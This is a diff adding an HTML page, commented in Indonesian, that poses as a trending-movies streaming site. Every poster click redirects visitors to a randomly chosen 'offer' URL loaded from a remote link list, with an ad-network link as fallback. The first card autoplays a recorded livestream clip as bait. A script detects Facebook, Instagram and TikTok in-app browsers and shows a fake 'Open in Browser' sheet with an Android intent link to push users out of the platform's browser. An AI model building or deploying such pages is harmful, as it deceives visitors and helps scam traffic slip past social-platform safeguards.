@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch Trending Movies Online</title>
+    
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Trending Movies Today - Watch Online" />
+    <meta property="og:description" content="Stream the latest trending movies in HD quality." />
+    <meta property="og:image" content="https://images.unsplash.com/photo-1536440136628-849c177e76a1?q=80&w=1200&auto=format&fit=crop" />
+
+    <style>
+        /* CSS Reset & Variables */
+        :root {
+            --bg-color: #0b0f19;
+            --surface: #151a27;
+            --text-main: #f1f5f9;
+            --accent: #e50914;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        /* Header / Title */
+        .header-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin: 4px 0;
+            padding-left: 8px;
+            border-left: 4px solid var(--accent);
+            background-color: var(--surface);
+            padding: 10px 10px 10px 12px;
+            border-radius: 4px;
+        }
+
+        /* Movie Grid Section */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr; /* Diubah menjadi 1 Kolom untuk PC & Mobile */
+            gap: 6px;
+        }
+
+        .movie-card {
+            position: relative;
+            aspect-ratio: 16 / 9; /* Diubah menjadi rasio 16:9 */
+            background-color: var(--surface);
+            border-radius: 4px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .movie-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+
+        /* Support img dan video untuk menutupi seluruh container */
+        .movie-card img, .movie-card video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* Loading State */
+        .loading-text {
+            text-align: center;
+            padding: 20px;
+            grid-column: 1 / -1;
+            color: #94a3b8;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .grid { gap: 4px; }
+            .header-title { font-size: 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header-title">Trending Movies Today</div>
+        
+        <div class="grid" id="movie-grid">
+            <div class="loading-text">Loading movies...</div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================================
+        //                       PENGATURAN
+        // ==========================================================
+        const LINK_FILE = 'https://seribudollarperhari.github.io/banner/link.txt'; // Sumber list URL Offer
+        const IMAGE_FILE = 'image.txt'; // Nama file yang berisi list URL gambar
+        
+        // TARGET_URL diubah menggunakan 'let' dan diberi link default jaga-jaga jika link.txt gagal di-load
+        let TARGET_URL = 'https://spreadpreferencetelevision.com/hhqe0ruxga?key=e3ff974fd2665b1074e29d32efa30da4';
+        
+        // Kumpulan Video Random untuk konten pertama
+        const RANDOM_VIDEOS = [
+            "https://res.cloudinary.com/owo2gyzw/video/upload/v1788564077/sukarekam.live_1785048697_3949596662858278879_80269978013.mp4",
+            "https://res.cloudinary.com/owo2gyzw/video/upload/v1788564070/sukarekam.live_1785045841_3949572916286158922_80269978013.mp4",
+            "https://res.cloudinary.com/owo2gyzw/video/upload/v1788564064/sukarekam.live_1785062391_3949711692056627161_80269978013.mp4"
+        ];
+        // ==========================================================
+
+        // Fungsi Redirect saat poster di-klik
+        function redirectToOffer() {
+            if(TARGET_URL) {
+                window.location.href = TARGET_URL;
+            }
+        }
+
+        // Script Deteksi Facebook / In-App Browser yang dijalankan setelah URL diacak
+        function checkInAppBrowser() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isInAppBrowser = /FBAN|FBAV|Instagram|TikTok|Line|Twitter|Threads/i.test(ua);
+            const isAndroid = /android/i.test(ua);
+            const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+            
+            if (isInAppBrowser && TARGET_URL) {
+                let parsedUrl;
+                try {
+                    parsedUrl = new URL(TARGET_URL);
+                } catch(e) {
+                    parsedUrl = new URL("https://" + TARGET_URL.replace(/^https?:\/\//, ''));
+                }
+                
+                let intentTarget = parsedUrl.host + parsedUrl.pathname + parsedUrl.search;
+                let normalHref = parsedUrl.href;
+                let fallbackEncoded = encodeURIComponent(normalHref);
+                
+                let actionHTML = '';
+                if (isAndroid) {
+                    const intentUrl = `intent://${intentTarget}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallbackEncoded};end`;
+                    actionHTML = `<a href="${intentUrl}" class="ia-btn primary">Continue</a>`;
+                } else if (isIOS) {
+                    actionHTML = `<span style="font-size:13px; color:#666; text-align:right; font-weight:600;">Tap <b>...</b> (menu)<br>Open in Safari</span>`;
+                } else {
+                    actionHTML = `<a href="${normalHref}" class="ia-btn primary">Continue</a>`;
+                }
+                
+                const sheetCSS = `<style>
+                    .ia-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:999998;display:flex;align-items:flex-end;justify-content:center}
+                    .ia-sheet{width:100%;max-width:600px;background:#fff;border-radius:20px 20px 0 0;padding:25px 20px;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;box-shadow:0 -4px 15px rgba(0,0,0,0.1);animation:slideUp 0.3s ease-out forwards}
+                    @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+                    .ia-header{text-align:center;font-size:17px;font-weight:700;color:#050505;padding-bottom:15px;border-bottom:1px solid #ced0d4;margin-bottom:20px}
+                    .ia-row{display:flex;align-items:center;justify-content:space-between}
+                    .ia-left{display:flex;align-items:center;gap:15px}
+                    .ia-icon{width:42px;height:42px}
+                    .ia-text{font-size:16px;font-weight:600;color:#050505}
+                    .ia-btn{background:#e4e6eb;color:#050505;font-size:15px;font-weight:600;padding:10px 24px;border-radius:24px;text-decoration:none;transition:0.2s}
+                    .ia-btn.primary{background:#0866ff;color:#fff}
+                </style>`;
+                
+                const sheetHTML = `
+                <div class="ia-overlay">
+                    <div class="ia-sheet">
+                        <div class="ia-header">Open in Browser...</div>
+                        <div class="ia-row">
+                            <div class="ia-left">
+                                <svg class="ia-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M24 10C16.27 10 10 16.27 10 24C10 31.73 16.27 38 24 38C31.73 38 38 31.73 38 24C38 16.27 31.73 10 24 10ZM24 13.5C28.42 13.5 32.2 16.23 33.72 20H16.24C17.97 16.03 21.84 13.5 24 13.5ZM13.88 26.5C13.62 25.7 13.5 24.87 13.5 24C13.5 22.18 14.04 20.48 14.97 19.06L23.75 34.27C18.66 33.84 14.63 30.64 13.88 26.5ZM24 28.5C21.51 28.5 19.5 26.49 19.5 24C19.5 21.51 21.51 19.5 24 19.5C26.49 19.5 28.5 21.51 28.5 24C28.5 26.49 26.49 28.5 24 28.5ZM24.47 34.48L17.7 22.75H32.48C32.8 24.08 33.15 25.5 33.15 27C33.15 31.06 29.83 34.39 25.7 34.48C25.29 34.49 24.88 34.49 24.47 34.48ZM34.27 24C34.27 25.13 34.07 26.21 33.7 27.21L26.31 14.43C30.93 15.65 34.27 19.45 34.27 24Z" fill="#4285F4"/>
+                                    <path d="M24 19.5C21.51 19.5 19.5 21.51 19.5 24C19.5 26.49 21.51 28.5 24 28.5C26.49 28.5 28.5 26.49 28.5 24C28.5 21.51 26.49 19.5 24 19.5Z" fill="#FFFFFF"/>
+                                </svg>
+                                <span class="ia-text">Chrome / Browser</span>
+                            </div>
+                            ${actionHTML}
+                        </div>
+                    </div>
+                </div>`;
+                
+                document.body.style.overflow = 'hidden';
+                document.body.insertAdjacentHTML('beforeend', sheetCSS + sheetHTML);
+            }
+        }
+
+        // Script Ambil Data dari image.txt dan Acak
+        async function loadMoviesFromTxt() {
+            const grid = document.getElementById('movie-grid');
+
+            try {
+                const response = await fetch(IMAGE_FILE);
+                
+                if (!response.ok) {
+                    throw new Error(`File ${IMAGE_FILE} tidak ditemukan`);
+                }
+
+                const textData = await response.text();
+                const imageUrls = textData.split(/\r?\n/).filter(line => line.trim() !== '');
+
+                if (imageUrls.length === 0) {
+                    grid.innerHTML = '<div class="loading-text" style="color: #e50914;">File image.txt kosong.</div>';
+                    return;
+                }
+
+                grid.innerHTML = '';
+                const shuffledImages = imageUrls.sort(() => 0.5 - Math.random());
+                const selectedImages = shuffledImages.slice(0, 12);
+                
+                // Ambil satu video acak
+                const randomVideo = RANDOM_VIDEOS[Math.floor(Math.random() * RANDOM_VIDEOS.length)];
+
+                selectedImages.forEach((imgUrl, index) => {
+                    const card = document.createElement('div');
+                    card.className = 'movie-card';
+                    card.onclick = redirectToOffer;
+                    
+                    // Render Video untuk konten pertama (index 0)
+                    if (index === 0) {
+                        card.innerHTML = `
+                            <video src="${randomVideo}" autoplay loop muted playsinline loading="lazy"></video>
+                        `;
+                    } else {
+                        // Render Image untuk sisanya
+                        card.innerHTML = `
+                            <img src="${imgUrl.trim()}" alt="Movie Poster ${index + 1}" loading="lazy">
+                        `;
+                    }
+                    
+                    grid.appendChild(card);
+                });
+
+            } catch (error) {
+                console.error("Gagal memuat file teks:", error);
+                grid.innerHTML = `<div class="loading-text" style="color: #e50914;">Gagal memuat daftar film. Pastikan file ${IMAGE_FILE} ada di hosting.</div>`;
+            }
+        }
+
+        // Fungsi Utama untuk Menjalankan Semua Setup Secara Berurutan
+        async function initApp() {
+            // 1. Ambil list URL dan tetapkan satu link acak sebagai TARGET_URL
+            try {
+                const linkResponse = await fetch(LINK_FILE);
+                if (linkResponse.ok) {
+                    const linkText = await linkResponse.text();
+                    const urls = linkText.split(/\r?\n/).filter(line => line.trim() !== '');
+                    
+                    if (urls.length > 0) {
+                        // Pilih 1 URL dari text secara acak
+                        TARGET_URL = urls[Math.floor(Math.random() * urls.length)].trim();
+                    }
+                }
+            } catch (error) {
+                console.error("Gagal memuat file link.txt, sistem akan menggunakan link default.", error);
+            }
+
+            // 2. Terapkan logika In-App Browser Facebook
+            checkInAppBrowser();
+
+            // 3. Load Poster Film
+            await loadMoviesFromTxt();
+        }
+
+        // Mulai aplikasi setelah halaman (DOM) siap diload
+        document.addEventListener("DOMContentLoaded", initApp);
+    </script>
+</body>
+</html>
